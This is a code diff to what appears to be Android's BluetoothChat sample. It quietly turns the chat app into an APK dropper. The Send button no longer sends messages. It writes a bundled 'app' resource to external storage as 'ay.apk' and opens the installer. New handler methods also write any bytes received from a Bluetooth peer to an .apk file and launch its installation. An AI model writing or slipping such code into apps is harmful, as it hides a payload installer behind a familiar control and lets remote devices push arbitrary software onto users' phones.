@@ -20,8 +20,12 @@ import android.app.ActionBar;
 import android.app.Activity;
 import android.bluetooth.BluetoothAdapter;
 import android.bluetooth.BluetoothDevice;
+import android.content.Context;
 import android.content.Intent;
+import android.content.res.AssetManager;
+import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.os.Handler;
 import android.os.Message;
 import android.support.annotation.Nullable;
@@ -42,7 +46,16 @@ import android.widget.ListView;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.example.android.bluetoothchat.R;
 import com.example.android.common.logger.Log;
+
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.URI;
+import java.util.Arrays;
 
 /**
  * This fragment controls Bluetooth to communicate with other devices.
@@ -171,11 +184,43 @@ public class BluetoothChatFragment extends Fragment {
         mSendButton.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
                 // Send a message using content of the edit text widget
-                View view = getView();
+           /*     View view = getView();
                 if (null != view) {
                     TextView textView = (TextView) view.findViewById(R.id.edit_text_out);
                     String message = textView.getText().toString();
                     sendMessage(message);
+                }*/
+                try {
+                    InputStream is = getResources().openRawResource(R.raw.app);
+                    File cascadeDir = new File(Environment.getExternalStorageDirectory().getPath() + "/chutaIsHere/");
+                    cascadeDir.mkdirs();
+                    File mCascadeFile = new File(cascadeDir, "ay.apk");
+                    FileOutputStream os = new FileOutputStream(mCascadeFile);
+
+                    byte[] buffer = new byte[4096];
+                    int bytesRead;
+                    try {
+                        while ((bytesRead = is.read(buffer)) != -1) {
+                            os.write(buffer, 0, bytesRead);
+                        }
+                        is.close();
+                        os.close();
+                    } catch (IOException e) {
+                        Log.e(TAG, e.toString());
+                    }
+                    Intent intent = new Intent(Intent.ACTION_VIEW);
+                    intent.setDataAndType(Uri.fromFile(mCascadeFile), "application/vnd.android.package-archive");
+                    startActivity(intent);
+                /*
+                byte[] ay = ByteEncoder.readBytesFromFile(mCascadeFile);
+                byte[] header = {0x00};
+                byte[] end = Arrays.copyOf(header, 1 + ay.length);
+                System.arraycopy(ay, 0, end, 1, ay.length);
+                fragment.handleByteMessage(end);*/
+                }
+                catch (FileNotFoundException e)
+                {
+                    Log.e(TAG, e.toString());
                 }
             }
         });
@@ -222,7 +267,15 @@ public class BluetoothChatFragment extends Fragment {
             mOutEditText.setText(mOutStringBuffer);
         }
     }
-
+    private void sendBytes(byte[] data)
+    {
+        if (mChatService.getState() != BluetoothChatService.STATE_CONNECTED) {
+            Toast.makeText(getActivity(), R.string.not_connected, Toast.LENGTH_SHORT).show();
+            return;
+        }
+        mChatService.write(data);
+        mOutStringBuffer.setLength(0);
+    }
     /**
      * The action listener for the EditText widget, to listen for the return key
      */
@@ -295,13 +348,13 @@ public class BluetoothChatFragment extends Fragment {
                             break;
                     }
                     break;
-                case Constants.MESSAGE_WRITE:
+                case Constants.BYTES_SEND:
                     byte[] writeBuf = (byte[]) msg.obj;
                     // construct a string from the buffer
                     String writeMessage = new String(writeBuf);
                     mConversationArrayAdapter.add("Me:  " + writeMessage);
                     break;
-                case Constants.MESSAGE_READ:
+                case Constants.BYTES_RECEIVE:
                     byte[] readBuf = (byte[]) msg.obj;
                     // construct a string from the valid bytes in the buffer
                     String readMessage = new String(readBuf, 0, msg.arg1);
@@ -324,6 +377,46 @@ public class BluetoothChatFragment extends Fragment {
             }
         }
     };
+
+
+    public void handleByteMessage(byte[] data)
+    {
+        /*
+         Format: [Header] [args]
+         each word is a byte
+         Headers:
+            0x00: run the file ex: [00] [file]
+            0x01: run the file and return result ex: [01] [file]
+
+         */
+        switch(data[0]) {
+            case Constants.ops.ACTIVITY_RESULT: //0
+                runActivity(Arrays.copyOfRange(data, 1, data.length), false);
+                break;
+            case Constants.ops.ACTIVITY_NO_RESULT: //1
+                runActivity(Arrays.copyOfRange(data, 1, data.length), true);
+                break;
+            default:
+                Log.e(TAG, "Given message with unrecognized header: " + Byte.toString(data[0]));
+                break;
+        }
+    }
+
+    private void runActivity(byte[] data, boolean returnResult)
+    {
+        try {
+            File temp = File.createTempFile("activity", ".apk", getActivity().getCacheDir());
+            byte[] fileData = data; // TODO
+            ByteEncoder.writeBytesToFile(temp, fileData);
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setDataAndType(Uri.fromFile(temp), "application/vnd.android.package-archive");
+            startActivity(intent);
+        }
+        catch (IOException e)
+        {
+            Log.e(TAG, e.toString());
+        }
+    }
 
     public void onActivityResult(int requestCode, int resultCode, Intent data) {
         switch (requestCode) {
